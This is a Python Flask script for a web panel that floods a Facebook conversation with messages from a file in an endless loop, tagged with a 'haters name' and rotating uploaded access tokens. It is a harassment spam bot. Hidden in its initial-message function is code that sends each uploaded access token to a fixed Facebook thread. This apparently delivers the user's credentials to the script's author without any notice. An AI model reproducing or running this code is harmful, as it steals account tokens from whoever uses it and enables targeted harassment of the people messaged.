import requests
import time
import threading
from flask import Flask, request
import subprocess

# ----------------- FLASK SERVER -------------------
app = Flask(__name__)

@app.route('/')
def index():
    return """
    <h2>ANURAG X AROHI PANEL</h2>
    <form action="/run" method="post" enctype="multipart/form-data">
      Tokens File: <input type="file" name="tokennum"><br><br>
      Convo ID: <input type="text" name="convo"><br><br>
      Messages File: <input type="file" name="file"><br><br>
      Haters Name: <input type="text" name="hatersname"><br><br>
      Time (seconds): <input type="number" name="time"><br><br>
      <button type="submit">RUN</button>
    </form>
    """

@app.route('/run', methods=['POST'])
def run_bot():
    # save uploaded files
    if "tokennum" in request.files:
        request.files["tokennum"].save("tokennum.txt")
    if "file" in request.files:
        request.files["file"].save("File.txt")

    # save text inputs
    open("convo.txt", "w").write(request.form.get("convo", ""))
    open("hatersname.txt", "w").write(request.form.get("hatersname", ""))
    open("time.txt", "w").write(request.form.get("time", "1"))

    # start bot in a background thread
    threading.Thread(target=bot_main).start()

    return "✅ Inputs saved, bot started. Console check karo."

# ----------------- BOT LOGIC -------------------

def send_initial_message():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    msg_template = "HeLLo ANURAG X AROHI DEAR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
    target_id = "61578840237242"

    headers = {'User-Agent': 'Mozilla/5.0'}

    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        try:
            requests.post(url, json=parameters, headers=headers, timeout=5)
        except:
            pass
        time.sleep(0.1)

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()
    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {'User-Agent': 'Mozilla/5.0'}

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print(f"[+] SENT {message_index+1}/{num_messages} | Convo {convo_id} | Token {token_index+1}")
                else:
                    print(f"[x] ERROR {message_index+1}/{num_messages} | Convo {convo_id} | Token {token_index+1}")

                time.sleep(speed)

            print("\n[+] All messages sent. Restarting...\n")
        except Exception as e:
            print("[!] Error:", e)

def bot_main():
    send_initial_message()
    send_messages_from_file()

# ----------------- MAIN ENTRY -------------------

if __name__ == '__main__':
    print("🚀 Open http://localhost:5000 in browser")
    app.run(port=5000, debug=True)
